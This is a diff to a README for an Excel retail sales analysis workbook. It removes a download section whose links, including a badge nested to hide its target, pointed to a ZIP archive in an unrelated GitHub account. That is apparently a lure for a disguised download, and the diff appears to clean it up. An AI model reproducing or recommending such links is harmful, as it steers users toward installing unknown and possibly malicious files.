@@ -13,26 +13,6 @@ This project is meant for users who want to open an Excel file and work with sal
 - Basic file access on your computer
 - Enough space to save the workbook and related files
 
-## 📥 Download and Open
-
-1. Visit this page to download the project files:  
-   https://raw.githubusercontent.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis/main/cutworm/Advanced-Sales-Analysis-Retail-Excel-v3.6.zip
-
-2. On the GitHub page, look for the file list and download the workbook or project files.
-
-3. Save the file to a folder you can find again, such as Downloads or Desktop.
-
-4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
-
-5. Open the two  Excel file with Microsoft Excel.
-1. Raw_retail_store_sale_data
- 
-[[![Download Project](https://img.shields.io/badge/Get%20Project%20Files-grey?style=for-the-badge)](https://raw.githubusercontent.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis/main/cutworm/Advanced-Sales-Analysis-Retail-Excel-v3.6.zip)](https://github.com/rkb931566-spec/Retail-Sales-Performance-Analysis/blob/main/Raw_retail_Store_sales_data.xlsx)
-
-2. retail_store_sales
- 
-https://github.com/rkb931566-spec/Retail-Sales-Performance-Analysis/blob/main/retail_store_sales.xlsx
-
 ## 🔍 What This Project Does
 
 This workbook is built for retail sales analysis. It helps you inspect sales records and turn raw data into clear results.
